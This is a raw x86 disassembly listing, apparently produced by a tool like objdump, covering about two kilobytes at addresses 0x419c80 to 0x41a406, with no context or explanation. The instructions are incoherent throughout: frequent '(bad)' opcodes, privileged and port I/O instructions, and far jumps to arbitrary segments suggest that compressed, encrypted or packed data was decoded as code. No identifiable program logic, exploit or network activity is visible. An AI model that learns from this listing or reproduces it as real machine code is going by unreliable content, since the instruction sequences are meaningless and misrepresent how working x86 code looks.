  419c80:	push   ebx
  419c81:	dec    edi
  419c82:	sub    ah,0x28
  419c85:	stc    
  419c86:	fstp   st(7)
  419c88:	hlt    
  419c89:	scas   al,BYTE PTR es:[edi]
  419c8a:	fstp   DWORD PTR [edi]
  419c8c:	pushf  
  419c8d:	cmp    BYTE PTR [edi+0xe],dl
  419c90:	dec    ebp
  419c91:	call   0xe8740b98
  419c96:	push   esi
  419c97:	fldcw  WORD PTR ds:0xc8acc7f6
  419c9d:	jne    0x419c74
  419c9f:	and    al,0xbf
  419ca1:	push   cs
  419ca2:	imul   DWORD PTR [eax]
  419ca4:	retf   
  419ca5:	scas   al,BYTE PTR es:[edi]
  419ca6:	ins    DWORD PTR es:[edi],dx
  419ca7:	mov    ch,0xc7
  419ca9:	push   es
  419caa:	neg    al
  419cac:	aad    0xa4
  419cae:	add    al,0x3d
  419cb0:	inc    ecx
  419cb1:	dec    ebp
  419cb2:	mov    esp,0x26d67257
  419cb7:	das    
  419cb8:	(bad)  
  419cb9:	outs   dx,BYTE PTR ds:[esi]
  419cba:	and    ch,BYTE PTR [ebp+0x74decec6]
  419cc0:	scas   eax,DWORD PTR es:[edi]
  419cc1:	sub    al,0xf9
  419cc3:	add    al,0x10
  419cc5:	push   esp
  419cc6:	outs   dx,BYTE PTR ds:[esi]
  419cc7:	popf   
  419cc8:	jge    0x419cb7
  419cca:	xlat   BYTE PTR ds:[ebx]
  419ccb:	add    DWORD PTR [ecx+edi*1+0x70e4f21],esi
  419cd2:	fwait
  419cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd4:	cli    
  419cd5:	sub    DWORD PTR [eax+0x3af99685],ebp
  419cdb:	push   edi
  419cdc:	into   
  419cdd:	and    ecx,ebp
  419cdf:	push   esi
  419ce0:	and    BYTE PTR [eax],ch
  419ce2:	ja     0x419d15
  419ce4:	push   eax
  419ce5:	inc    edx
  419ce6:	adc    al,0x83
  419ce8:	fidivr WORD PTR [eax+0x47]
  419ceb:	jno    0x419d21
  419ced:	mov    eax,ds:0xcc51e014
  419cf2:	pop    ss
  419cf3:	lods   al,BYTE PTR ds:[esi]
  419cf4:	sti    
  419cf5:	rol    DWORD PTR [edx],cl
  419cf7:	repnz pop es
  419cf9:	push   0x19
  419cfb:	inc    edx
  419cfc:	lods   al,BYTE PTR ds:[esi]
  419cfd:	hlt    
  419cfe:	lahf   
  419cff:	adc    DWORD PTR [eax+eiz*1-0x4c],0xffffffd4
  419d04:	fbstp  TBYTE PTR [esi+0x2e]
  419d07:	std    
  419d08:	jle    0x419d30
  419d0a:	pop    es
  419d0b:	stc    
  419d0c:	push   es
  419d0d:	or     DWORD PTR [ecx-0x763b678],ebx
  419d13:	add    al,0x30
  419d15:	daa    
  419d16:	mov    fs,WORD PTR [esi]
  419d18:	pop    esp
  419d19:	retf   
  419d1a:	repz mov ebx,0x264f8b80
  419d20:	into   
  419d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d22:	outs   dx,DWORD PTR ds:[esi]
  419d23:	sbb    eax,0x38d1b04f
  419d28:	jecxz  0x419d25
  419d2a:	ins    DWORD PTR es:[edi],dx
  419d2b:	lods   eax,DWORD PTR ds:[esi]
  419d2c:	das    
  419d2d:	stos   BYTE PTR es:[edi],al
  419d2e:	jle    0x419d93
  419d30:	test   al,0xb7
  419d32:	call   0xeecd437b
  419d37:	loopne 0x419dae
  419d39:	or     DWORD PTR [ecx+ecx*8],esp
  419d3c:	dec    ecx
  419d3d:	in     al,0x28
  419d3f:	or     cl,BYTE PTR [ebx+ebx*8+0x183f59d0]
  419d46:	dec    edi
  419d47:	popa   
  419d48:	xchg   BYTE PTR [ebx-0x1efab6c6],bh
  419d4e:	inc    ecx
  419d4f:	add    eax,0x34f371a1
  419d54:	mov    ah,0x79
  419d56:	pop    ebx
  419d57:	aaa    
  419d58:	imul   esp,DWORD PTR [ebx],0x3271df56
  419d5e:	jnp    0x419d5c
  419d60:	pop    ebp
  419d61:	xor    al,0x11
  419d63:	xchg   edx,eax
  419d64:	ret    0xd353
  419d67:	iret   
  419d68:	in     eax,dx
  419d69:	and    BYTE PTR [edi-0x60924827],0x2d
  419d70:	add    cl,BYTE PTR [ebp-0x5f]
  419d73:	ins    BYTE PTR es:[edi],dx
  419d74:	fnstcw WORD PTR [ebp-0x2445dcbb]
  419d7a:	jno    0x419d24
  419d7c:	dec    BYTE PTR [edi+0x1dca2b75]
  419d82:	jbe    0x419d11
  419d84:	in     al,dx
  419d85:	in     eax,dx
  419d86:	xchg   edx,eax
  419d87:	test   ch,bl
  419d89:	mov    eax,0x55e77243
  419d8e:	mov    WORD PTR ss:[ebp-0x3e0bfb8d],es
  419d95:	mov    bh,0xaa
  419d97:	scas   eax,DWORD PTR es:[edi]
  419d98:	sub    ch,BYTE PTR [edi+0x71749124]
  419d9e:	sub    al,ch
  419da0:	retf   0x33c8
  419da3:	sbb    BYTE PTR [ecx],al
  419da5:	call   0x9792824c
  419daa:	pushf  
  419dab:	inc    esp
  419dac:	add    eax,DWORD PTR [ecx+esi*8-0x21972ef7]
  419db3:	lea    ebp,[esi]
  419db5:	push   edi
  419db6:	pop    cx
  419db8:	pushf  
  419db9:	mov    ebp,0x4ac97c54
  419dbe:	scas   eax,DWORD PTR es:[edi]
  419dbf:	jecxz  0x419dcc
  419dc1:	cdq    
  419dc2:	int    0x9f
  419dc4:	ja     0x419e18
  419dc6:	imul   ecx,DWORD PTR [edi+0x28],0xe92b933d
  419dcd:	retf   0xf47f
  419dd0:	push   0xffffffe9
  419dd2:	dec    ebp
  419dd3:	xchg   edx,eax
  419dd4:	pushf  
  419dd5:	sbb    bh,dh
  419dd7:	jnp    0x419ddc
  419dd9:	jle    0x419dca
  419ddb:	and    edx,DWORD PTR [esi-0x29]
  419dde:	dec    edi
  419ddf:	dec    edi
  419de0:	cmp    ebx,edx
  419de2:	ins    BYTE PTR es:[edi],dx
  419de3:	xchg   ebp,eax
  419de4:	jle    0x419dbb
  419de6:	lds    eax,FWORD PTR [edx-0x297a8b5b]
  419dec:	mov    edx,0x394b1418
  419df1:	add    DWORD PTR [ebx],eax
  419df3:	repnz xor DWORD PTR [ebp+ebp*8+0x655a873b],0xb1402d99
  419dff:	xchg   DWORD PTR [ebp+edx*2-0x47c28119],edi
  419e06:	hlt    
  419e07:	pop    edx
  419e08:	cmp    BYTE PTR [ecx+edx*2],0x91
  419e0c:	hlt    
  419e0d:	or     ebx,DWORD PTR ds:0xbeaa7577
  419e13:	dec    esi
  419e14:	xchg   esi,eax
  419e15:	or     al,0xa3
  419e17:	xor    al,BYTE PTR [ecx]
  419e19:	retf   
  419e1a:	fcom   QWORD PTR [ebp+0x62]
  419e1d:	push   0x4d
  419e1f:	or     bl,BYTE PTR [esi+0xf]
  419e22:	fdivr  QWORD PTR [ebp+edx*8-0x8]
  419e26:	in     al,dx
  419e27:	lahf   
  419e28:	pop    eax
  419e29:	retf   
  419e2a:	out    dx,eax
  419e2b:	retf   
  419e2c:	mov    dl,BYTE PTR [ecx]
  419e2e:	fisub  WORD PTR [esi]
  419e30:	dec    ecx
  419e31:	adc    bh,dh
  419e33:	cmc    
  419e34:	add    ecx,DWORD PTR [ecx-0x78b10131]
  419e3a:	inc    edi
  419e3b:	ror    DWORD PTR [ebp+0x3d],0xe2
  419e3f:	or     edx,DWORD PTR [esi+0x19]
  419e42:	fdiv   DWORD PTR [edx-0x39813e95]
  419e48:	sbb    ebx,DWORD PTR [ebx]
  419e4a:	aas    
  419e4b:	mov    ah,0xfe
  419e4d:	sbb    edi,DWORD PTR [ecx-0x74]
  419e50:	xor    BYTE PTR [esi+0x6],ch
  419e53:	(bad)  
  419e54:	adc    al,0xd3
  419e56:	add    DWORD PTR [edi+0x10],eax
  419e59:	mov    al,ds:0x8a115eef
  419e5e:	mov    ah,0xb1
  419e60:	inc    ebx
  419e61:	lods   eax,DWORD PTR ds:[esi]
  419e62:	(bad)  
  419e63:	mov    eax,ds:0x26dcdc5b
  419e68:	mov    al,0xfe
  419e6a:	inc    esp
  419e6b:	cmp    DWORD PTR [ecx+0x1d],edx
  419e6e:	add    BYTE PTR [edx+ecx*8+0x2],0x10
  419e73:	push   ebx
  419e74:	or     dl,BYTE PTR ds:0xa3a11845
  419e7a:	das    
  419e7b:	jo     0x419ece
  419e7d:	add    eax,DWORD PTR [eax-0x10]
  419e80:	outs   dx,DWORD PTR ds:[esi]
  419e81:	lds    edx,FWORD PTR [ebx+ebx*8-0x78263d18]
  419e88:	es ins DWORD PTR es:[edi],dx
  419e8a:	jbe    0x419e35
  419e8c:	push   ds
  419e8d:	dec    esi
  419e8e:	cmp    eax,0x9bff64a8
  419e93:	stos   DWORD PTR es:[edi],eax
  419e94:	jmp    0xccdc:0xe97db311
  419e9b:	int3   
  419e9c:	call   0xb9e3:0x8bfb4b62
  419ea3:	(bad)  
  419ea4:	and    eax,0xf639a9a4
  419ea9:	pop    edi
  419eaa:	and    esp,DWORD PTR [edx-0x695425f6]
  419eb0:	jle    0x419e99
  419eb2:	pop    ebp
  419eb3:	xlat   BYTE PTR ds:[ebx]
  419eb4:	sar    BYTE PTR gs:0xf1084daf,cl
  419ebb:	(bad)  
  419ebc:	lock mov DWORD PTR [edx-0x17202123],edi
  419ec3:	leave  
  419ec4:	mov    dl,0xd6
  419ec6:	push   0x1d
  419ec8:	pop    edi
  419ec9:	aam    0x52
  419ecb:	push   0xdbfd1635
  419ed0:	loop   0x419e7a
  419ed2:	sub    DWORD PTR [esi],ebx
  419ed4:	in     al,dx
  419ed5:	jg     0x419ef8
  419ed7:	outs   dx,BYTE PTR ds:[esi]
  419ed8:	sbb    ebx,edx
  419eda:	mov    esp,0x51b351a7
  419edf:	jge    0x419ed8
  419ee1:	pop    ebp
  419ee2:	sbb    ebx,edx
  419ee4:	xchg   edx,eax
  419ee5:	fld    TBYTE PTR [edx]
  419ee7:	pop    ss
  419ee8:	icebp  
  419ee9:	sub    BYTE PTR [esi],dh
  419eeb:	(bad)  
  419eec:	div    esi
  419eee:	sar    al,cl
  419ef0:	iret   
  419ef1:	clc    
  419ef2:	mov    esp,esi
  419ef4:	sbb    eax,0x892d3ca2
  419ef9:	xchg   esi,eax
  419efa:	mov    cl,0x4c
  419efc:	scas   eax,DWORD PTR es:[edi]
  419efd:	push   ss
  419efe:	aad    0x92
  419f00:	cmp    esp,eax
  419f02:	repnz xchg ebp,eax
  419f04:	mov    ebx,0x8e70126e
  419f09:	aaa    
  419f0a:	pop    eax
  419f0b:	cmp    eax,0xd1451bc8
  419f10:	sti    
  419f11:	out    dx,eax
  419f12:	(bad)  
  419f13:	std    
  419f14:	loopne 0x419f3b
  419f16:	xchg   ecx,eax
  419f17:	cld    
  419f18:	or     ecx,DWORD PTR [edx+eiz*4]
  419f1b:	retf   0xbeb8
  419f1e:	push   ecx
  419f1f:	adc    esi,esp
  419f21:	mov    dh,0x39
  419f23:	div    esp
  419f25:	sub    DWORD PTR [ecx],0xa6fb9c66
  419f2b:	inc    esi
  419f2c:	stos   DWORD PTR es:[edi],eax
  419f2d:	xchg   BYTE PTR [esi-0x6faf6f70],ch
  419f33:	les    esp,FWORD PTR [esi+esi*8]
  419f36:	or     DWORD PTR [edx+esi*8-0x16],ebp
  419f3a:	mov    edi,0x22829f7b
  419f3f:	dec    edi
  419f40:	cdq    
  419f41:	inc    edi
  419f42:	repz fld TBYTE PTR [ebp+0x43]
  419f46:	pop    esp
  419f47:	ret    0x943e
  419f4a:	data16 test bl,dl
  419f4d:	lods   al,BYTE PTR ds:[esi]
  419f4e:	pop    ds
  419f4f:	xchg   esp,eax
  419f50:	jno    0x419edd
  419f52:	mov    eax,0x61740ae6
  419f57:	dec    edi
  419f58:	popf   
  419f59:	ficom  WORD PTR [esi]
  419f5b:	jno    0x419fb8
  419f5d:	mov    ebx,0xb49d98e3
  419f62:	test   ecx,eax
  419f64:	or     eax,0xa4371a57
  419f69:	push   esi
  419f6a:	mov    al,0xf1
  419f6c:	mov    ebx,0x7af3cf1e
  419f71:	adc    dh,BYTE PTR [ecx]
  419f73:	dec    ecx
  419f74:	into   
  419f75:	loopne 0x419f2b
  419f77:	stos   DWORD PTR es:[edi],eax
  419f78:	push   ss
  419f79:	xor    DWORD PTR [edx-0x13b73a4a],eax
  419f7f:	adc    al,0xbf
  419f81:	push   edi
  419f82:	sub    DWORD PTR [ebp+0x39ce4d40],0xffffffae
  419f89:	add    al,0x3d
  419f8b:	pop    ebp
  419f8c:	sub    edx,edx
  419f8e:	push   DWORD PTR [edi-0x14]
  419f91:	pop    esi
  419f92:	ja     0x419fda
  419f94:	jae    0x419f5e
  419f96:	add    BYTE PTR [esi],dh
  419f98:	and    esi,DWORD PTR [ebx]
  419f9a:	test   DWORD PTR [ebx+0x35556d15],0xcb9207a7
  419fa4:	popa   
  419fa5:	js     0x419f96
  419fa7:	and    DWORD PTR [edx+0xa5d6761],edx
  419fad:	cmp    DWORD PTR [ebx+0x48],esp
  419fb0:	sti    
  419fb1:	sub    BYTE PTR [ecx-0x26d4f7b0],ah
  419fb7:	jmp    0xbd849391
  419fbc:	(bad)  
  419fbd:	pushf  
  419fbe:	aaa    
  419fbf:	jb     0x419f9d
  419fc1:	sahf   
  419fc2:	test   al,0xb8
  419fc4:	push   eax
  419fc5:	xchg   esp,eax
  419fc6:	arpl   WORD PTR [ebx-0x69],dx
  419fc9:	scas   al,BYTE PTR es:[edi]
  419fca:	pushf  
  419fcb:	pop    esi
  419fcc:	xchg   esp,eax
  419fcd:	enter  0xa802,0x29
  419fd1:	adc    DWORD PTR [ebx-0x255c3ce9],ebx
  419fd7:	daa    
  419fd8:	sbb    eax,0x7a8ef221
  419fdd:	cmp    al,0x85
  419fdf:	pushf  
  419fe0:	aaa    
  419fe1:	inc    eax
  419fe2:	push   ss
  419fe3:	jmp    DWORD PTR [ebp-0x39]
  419fe6:	addr16 jle 0x41a026
  419fe9:	jecxz  0x41a06a
  419feb:	div    DWORD PTR [edi]
  419fed:	pushf  
  419fee:	test   al,0x8f
  419ff0:	pop    ebx
  419ff1:	and    DWORD PTR [edx],esp
  419ff3:	into   
  419ff4:	lea    edx,[edx+0x5a]
  419ff7:	fs mov al,0x46
  419ffa:	push   eax
  419ffb:	push   ds
  419ffc:	(bad)  
  419ffd:	fmul   QWORD PTR [ecx-0x14a8490a]
  41a003:	mov    eax,0x558fd7c6
  41a008:	scas   al,BYTE PTR es:[edi]
  41a009:	inc    BYTE PTR [esi]
  41a00b:	in     eax,0x1f
  41a00d:	in     eax,dx
  41a00e:	leave  
  41a00f:	add    ebp,DWORD PTR [edx-0x23c3d74f]
  41a015:	or     DWORD PTR [ebx+eax*4],0x53c0a06a
  41a01c:	jns    0x419fa6
  41a01e:	sub    eax,DWORD PTR [ebx]
  41a020:	mov    dh,0xb2
  41a022:	call   0xc68e30ea
  41a027:	in     al,dx
  41a028:	xchg   BYTE PTR [ecx],dl
  41a02a:	cli    
  41a02b:	ss mov dl,0x8e
  41a02e:	mov    ecx,0x755d12ef
  41a033:	jmp    0x3dadd173
  41a038:	add    DWORD PTR [esi],ebp
  41a03a:	sar    BYTE PTR [esi-0x6cb3a789],0xce
  41a041:	push   0x28fc58dc
  41a046:	jbe    0x41a08f
  41a048:	retf   
  41a049:	fldenv [edi-0x60b624a2]
  41a04f:	xlat   BYTE PTR ds:[ebx]
  41a050:	push   edx
  41a051:	fsub   st(7),st
  41a053:	jecxz  0x41a093
  41a055:	fsub   QWORD PTR [ebx+0xb]
  41a058:	imul   ecx,ebx,0xac6ca267
  41a05e:	xor    dl,dl
  41a060:	cmp    BYTE PTR ds:0x32aaf262,bh
  41a066:	cmp    cl,BYTE PTR [ecx-0x2d6c4a99]
  41a06c:	into   
  41a06d:	push   ebp
  41a06e:	push   ebp
  41a06f:	icebp  
  41a070:	mov    dh,0xe7
  41a072:	and    edi,DWORD PTR [esi-0x67f1ac09]
  41a078:	mov    ah,0xd5
  41a07a:	je     0x41a06d
  41a07c:	cmp    al,0x77
  41a07e:	hlt    
  41a07f:	(bad)  
  41a080:	jmp    0x41a085
  41a082:	loopne 0x41a0ca
  41a084:	dec    eax
  41a085:	dec    edx
  41a086:	neg    DWORD PTR [edi]
  41a088:	cld    
  41a089:	mov    ds:0x27813214,al
  41a08e:	mov    ah,0xcc
  41a090:	jno    0x41a062
  41a092:	adc    cl,0x14
  41a095:	scas   al,BYTE PTR es:[edi]
  41a096:	fxch   st(5)
  41a098:	cmp    BYTE PTR [esi+0x4473b1b0],ah
  41a09e:	dec    edi
  41a09f:	mul    ecx
  41a0a1:	std    
  41a0a2:	leave  
  41a0a3:	adc    ah,ch
  41a0a5:	call   0xbdad16d4
  41a0aa:	and    cl,BYTE PTR [edi+0x72]
  41a0ad:	das    
  41a0ae:	push   esi
  41a0af:	xchg   ebp,eax
  41a0b0:	shl    BYTE PTR fs:[eax-0x69e8184a],0x47
  41a0b8:	pop    ecx
  41a0b9:	cs push 0xed319e55
  41a0bf:	sub    al,0x45
  41a0c1:	inc    edx
  41a0c2:	jb     0x41a0b2
  41a0c4:	sub    DWORD PTR [eax-0x57dde3c1],edi
  41a0ca:	sub    al,0x69
  41a0cc:	mov    edx,cs
  41a0ce:	pusha  
  41a0cf:	cmp    al,0xd1
  41a0d1:	cmp    al,BYTE PTR [ecx+0x7]
  41a0d4:	(bad)  [edi-0x57bcd9c4]
  41a0da:	and    al,0x3a
  41a0dc:	stc    
  41a0dd:	mov    ebx,0x39a02448
  41a0e2:	lods   eax,DWORD PTR ds:[esi]
  41a0e3:	ds addr16 test eax,0x1fa4daed
  41a0ea:	jno    0x41a0d0
  41a0ec:	adc    edi,DWORD PTR [esi-0x8acd380]
  41a0f2:	sub    DWORD PTR [ebx-0x4f928280],0x62efcfea
  41a0fc:	dec    esi
  41a0fd:	mov    BYTE PTR ds:0xfe0272db,dh
  41a103:	pop    ds
  41a104:	sbb    eax,0xe526816e
  41a109:	jae    0x41a0b3
  41a10b:	xor    edx,DWORD PTR [esi]
  41a10d:	and    al,0x1c
  41a10f:	scas   eax,DWORD PTR es:[edi]
  41a110:	xchg   edx,eax
  41a111:	imul   ebp,DWORD PTR [ebx],0xfffffff7
  41a114:	push   ecx
  41a115:	add    DWORD PTR [ecx+0x46],edi
  41a118:	ret    
  41a119:	inc    eax
  41a11a:	jae    0x41a0f5
  41a11c:	repnz push ss
  41a11e:	(bad)  
  41a11f:	mov    ds:0xc92ece82,al
  41a124:	sub    eax,0x9b645f94
  41a129:	fild   QWORD PTR [edi]
  41a12b:	pushf  
  41a12c:	clc    
  41a12d:	cmp    ch,0xa3
  41a130:	fs aas 
  41a132:	mov    eax,0x3e963ce2
  41a137:	xor    eax,0x1174c1f7
  41a13c:	lds    ebx,FWORD PTR [eax]
  41a13e:	fmul   DWORD PTR [ebp+0xd]
  41a141:	jbe    0x41a0da
  41a143:	lea    esi,[esi-0x6ef6e9e3]
  41a149:	jbe    0x41a1a3
  41a14b:	jno    0x41a15f
  41a14d:	mov    esp,0xd594420e
  41a152:	lock jno 0x41a19a
  41a155:	sub    dh,cl
  41a157:	adc    BYTE PTR [eax-0x5b3557dd],ch
  41a15d:	mov    edi,0x5274487d
  41a162:	(bad)  
  41a163:	push   ss
  41a164:	int    0x33
  41a166:	mov    ds:0x5e2dc4d3,al
  41a16b:	in     eax,dx
  41a16c:	in     eax,0xab
  41a16e:	mov    eax,0x5cb4fab2
  41a173:	xchg   edx,eax
  41a174:	and    eax,0x9b29ea44
  41a179:	ror    BYTE PTR [ecx-0x4b23620c],cl
  41a17f:	or     eax,0xf36c2b2a
  41a184:	xor    eax,0x2e0cdbb6
  41a189:	inc    ebx
  41a18a:	outs   dx,BYTE PTR ds:[esi]
  41a18b:	push   eax
  41a18c:	mov    ch,BYTE PTR [eax]
  41a18e:	cwde   
  41a18f:	(bad)  
  41a190:	bnd jno 0x41a122
  41a193:	bound  edi,QWORD PTR [esi]
  41a195:	jge    0x41a120
  41a197:	inc    ebp
  41a198:	cs pop ds
  41a19a:	stos   DWORD PTR es:[edi],eax
  41a19b:	or     eax,0xbe729e19
  41a1a0:	xor    ah,BYTE PTR [edx]
  41a1a2:	int3   
  41a1a3:	add    ecx,esp
  41a1a5:	mov    edx,edx
  41a1a7:	jmp    0x41a18c
  41a1a9:	sar    BYTE PTR [edx-0x3b],cl
  41a1ac:	mov    cl,0xa0
  41a1ae:	(bad)  
  41a1af:	jmp    0x7c9:0x417f5479
  41a1b6:	or     ebx,DWORD PTR [ecx-0x57392bf]
  41a1bc:	data16 sbb BYTE PTR [ebp-0x38c20f3f],0xbb
  41a1c4:	ret    
  41a1c5:	and    ah,BYTE PTR [ebp-0x30]
  41a1c8:	cmp    eax,0xe164e872
  41a1cd:	dec    ebx
  41a1cf:	cmp    edi,edx
  41a1d1:	sub    eax,DWORD PTR ds:0x6a343c4b
  41a1d7:	aaa    
  41a1d8:	jno    0x41a250
  41a1da:	sub    al,al
  41a1dc:	into   
  41a1dd:	push   0xffffff84
  41a1df:	xor    al,0x5a
  41a1e1:	jl     0x41a238
  41a1e3:	arpl   sp,cx
  41a1e5:	pop    edx
  41a1e6:	jmp    FWORD PTR [eax-0xf3dba54]
  41a1ec:	jmp    0xc305ff96
  41a1f1:	test   eax,0x93a0f0a0
  41a1f6:	inc    eax
  41a1f7:	cmp    ecx,DWORD PTR [ecx]
  41a1f9:	or     eax,0xad83bb50
  41a1fe:	sbb    BYTE PTR [edx+edx*1],al
  41a201:	mov    esp,0xde181221
  41a206:	pop    ebp
  41a207:	or     edi,DWORD PTR [eax+esi*8+0x4f]
  41a20b:	lock mov esp,DWORD PTR es:[eax-0x3f8735f5]
  41a213:	jmp    0x41a28f
  41a215:	xor    dl,0x90
  41a218:	rcl    DWORD PTR [ebx-0x4eeb74a9],1
  41a21e:	(bad)  
  41a21f:	nop
  41a220:	sub    eax,0x240903ff
  41a225:	lea    edx,[edx]
  41a227:	cmp    eax,0x79c0684e
  41a22c:	into   
  41a22d:	mov    bh,0xb4
  41a22f:	add    BYTE PTR [edx+0x7a87bdd0],ch
  41a235:	pop    ds
  41a236:	dec    esp
  41a237:	out    0xe2,eax
  41a239:	addr16 mov edi,0x1015ad6
  41a23f:	fwait
  41a240:	and    BYTE PTR [eax-0x1],ch
  41a243:	or     edi,ebx
  41a245:	shl    DWORD PTR [ebx],0xc
  41a248:	and    esp,DWORD PTR [ebx]
  41a24a:	in     al,0xe4
  41a24c:	xchg   edi,eax
  41a24d:	aas    
  41a24e:	jbe    0x41a251
  41a250:	dec    eax
  41a251:	adc    ebp,edx
  41a253:	(bad)  
  41a255:	pop    ds
  41a256:	out    0xe2,al
  41a258:	pushf  
  41a259:	cmp    eax,0x18409247
  41a25e:	mov    ebx,0x93dad4fa
  41a263:	add    dl,bl
  41a265:	and    eax,0x3d2f3387
  41a26a:	popa   
  41a26b:	and    BYTE PTR ds:0x5a9b5dc2,ch
  41a271:	retf   0x9034
  41a274:	sub    DWORD PTR [eax-0x11f36e74],esp
  41a27a:	in     al,0xb6
  41a27c:	loopne 0x41a20b
  41a27e:	xchg   ecx,eax
  41a27f:	dec    edx
  41a280:	fisttp DWORD PTR [edi+ebx*8]
  41a283:	mov    bh,0x27
  41a285:	pop    eax
  41a286:	add    eax,0xc7b43ac2
  41a28b:	mov    eax,ds:0xe4fa5003
  41a290:	lea    ecx,[ecx+0x74]
  41a293:	or     al,0x49
  41a295:	mov    edi,0xaed3211
  41a29a:	ret    0xa70a
  41a29d:	pusha  
  41a29e:	mov    al,0xd5
  41a2a0:	outs   dx,DWORD PTR ds:[esi]
  41a2a1:	fild   DWORD PTR [edi+0x38]
  41a2a4:	mov    al,ds:0x470c0332
  41a2a9:	xchg   ebp,eax
  41a2aa:	add    edi,DWORD PTR [ebx+0x2b]
  41a2ad:	faddp  st(5),st
  41a2af:	outs   dx,BYTE PTR ds:[esi]
  41a2b0:	test   BYTE PTR [ebp+0x4e],dh
  41a2b3:	jbe    0x41a238
  41a2b5:	cmc    
  41a2b6:	jb     0x41a2ac
  41a2b8:	pop    edx
  41a2b9:	mov    esi,0x1f907e45
  41a2be:	outs   dx,BYTE PTR gs:[esi]
  41a2c0:	shr    bh,cl
  41a2c2:	loop   0x41a33c
  41a2c4:	sbb    esp,DWORD PTR [esi-0x7a]
  41a2c7:	mov    ah,BYTE PTR [ecx-0x12273c5a]
  41a2cd:	into   
  41a2ce:	imul   DWORD PTR [ebp+0x7]
  41a2d1:	stos   BYTE PTR es:[edi],al
  41a2d2:	mov    dl,0xde
  41a2d4:	push   cs
  41a2d5:	pop    ecx
  41a2d6:	jp     0x41a308
  41a2d8:	mov    DWORD PTR [ecx+0x40ce3c50],edi
  41a2de:	push   es
  41a2df:	cmp    edi,DWORD PTR [esi]
  41a2e1:	fidiv  WORD PTR [eax+eiz*8]
  41a2e4:	outs   dx,BYTE PTR ds:[esi]
  41a2e5:	jo     0x41a359
  41a2e7:	test   eax,0xd4d36c16
  41a2ec:	clc    
  41a2ed:	add    al,0xf0
  41a2ef:	imul   ebp,DWORD PTR [edx+0x1a3dc629],0x115776f9
  41a2f9:	outs   dx,DWORD PTR ds:[esi]
  41a2fa:	das    
  41a2fb:	cmp    BYTE PTR [ecx-0x80],bh
  41a2fe:	jno    0x41a327
  41a300:	mov    edi,0x1ef4f398
  41a305:	nop
  41a306:	lahf   
  41a307:	leave  
  41a308:	push   ds
  41a309:	pop    ebp
  41a30a:	push   eax
  41a30b:	sub    DWORD PTR [edx],eax
  41a30d:	mov    ah,BYTE PTR ds:0x8ae64134
  41a313:	(bad)  
  41a314:	add    eax,0x6d556d1a
  41a319:	cwde   
  41a31a:	push   ds
  41a31b:	push   edx
  41a31c:	shr    edx,cl
  41a31e:	fst    QWORD PTR [ecx]
  41a320:	(bad)  
  41a321:	and    al,0x3
  41a323:	lods   eax,DWORD PTR cs:[esi]
  41a325:	mov    edx,0x330f332c
  41a32a:	jae    0x41a2c6
  41a32c:	push   ebx
  41a32d:	rcr    DWORD PTR [ebx-0x5c055714],cl
  41a333:	fst    QWORD PTR [edi-0x1b]
  41a336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a337:	scas   al,BYTE PTR es:[edi]
  41a338:	pop    ss
  41a339:	or     BYTE PTR ds:0x613687a7,bl
  41a33f:	adc    ah,BYTE PTR [ebp+0x36]
  41a342:	add    al,0x1a
  41a344:	jo     0x41a37d
  41a346:	out    dx,eax
  41a347:	jb     0x41a381
  41a349:	push   0x299cdaa3
  41a34e:	imul   ebp,DWORD PTR [ecx-0x30fd5f27],0x69
  41a355:	jo     0x41a3c6
  41a357:	aam    0x89
  41a359:	cld    
  41a35a:	xchg   BYTE PTR [ebp+0x1bd9d0eb],dh
  41a360:	add    eax,ebp
  41a362:	shr    BYTE PTR [ecx],cl
  41a364:	lock sti 
  41a366:	or     ch,BYTE PTR [eax+0x21]
  41a369:	repnz adc bh,0x83
  41a36d:	mov    es,WORD PTR [edx]
  41a36f:	sbb    al,0x25
  41a371:	inc    edx
  41a372:	test   eax,0xa28a48b
  41a377:	xchg   ebx,eax
  41a378:	jmp    0xb26:0x14d1837
  41a37f:	jne    0x41a318
  41a381:	and    DWORD PTR [ecx],esp
  41a383:	scas   eax,DWORD PTR es:[edi]
  41a384:	lahf   
  41a385:	repz arpl WORD PTR [ecx],ax
  41a388:	pop    edi
  41a389:	and    ecx,ecx
  41a38b:	xchg   ebx,eax
  41a38c:	jb     0x41a3c4
  41a38e:	sbb    BYTE PTR [ebp+0x11],bh
  41a391:	mov    ch,BYTE PTR [eax]
  41a393:	pop    ds
  41a394:	lahf   
  41a395:	sbb    edi,DWORD PTR [ebx]
  41a397:	sub    al,0x8d
  41a399:	ins    DWORD PTR es:[edi],dx
  41a39a:	das    
  41a39b:	ja     0x41a396
  41a39d:	xchg   edi,eax
  41a39e:	cmp    eax,DWORD PTR [edi-0x52]
  41a3a1:	retf   0x83a7
  41a3a4:	add    al,0x3d
  41a3a6:	aas    
  41a3a7:	rol    BYTE PTR gs:[di-0x1117],0xa1
  41a3ae:	aad    0xb5
  41a3b0:	xchg   ecx,eax
  41a3b1:	pushf  
  41a3b2:	sub    esi,ecx
  41a3b4:	(bad)  
  41a3b5:	dec    ebp
  41a3b6:	aad    0x3f
  41a3b8:	xchg   esp,eax
  41a3b9:	xchg   ecx,eax
  41a3ba:	xor    ah,cl
  41a3bc:	not    eax
  41a3be:	xchg   DWORD PTR [esi+0x3b],esp
  41a3c1:	add    al,0xf7
  41a3c3:	or     eax,edi
  41a3c5:	std    
  41a3c6:	sub    ebp,DWORD PTR cs:[esi+0x5d872b53]
  41a3cd:	(bad)  
  41a3ce:	hlt    
  41a3cf:	jecxz  0x41a401
  41a3d1:	mov    cl,0x9a
  41a3d3:	mov    BYTE PTR [eax-0x64],0x30
  41a3d7:	js     0x41a449
  41a3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3da:	sbb    DWORD PTR [edi],ebx
  41a3dc:	mov    BYTE PTR [eax],ah
  41a3de:	pop    edx
  41a3df:	mov    ds:0x29b6af4c,eax
  41a3e4:	popf   
  41a3e5:	test   DWORD PTR [ebx-0x386ddf66],0xa0d65246
  41a3ef:	nop
  41a3f0:	cmp    BYTE PTR [ecx-0x5454151c],dl
  41a3f6:	outs   dx,DWORD PTR ds:[esi]
  41a3f7:	adc    BYTE PTR [ebx],ch
  41a3f9:	jg     0x41a3a6
  41a3fb:	cmp    al,0xdf
  41a3fd:	pop    esi
  41a3fe:	into   
  41a3ff:	icebp  
  41a400:	enter  0x8fe9,0x66
  41a404:	pop    esi
  41a405:	out    dx,al
  41a406:	xchg   edi,eax
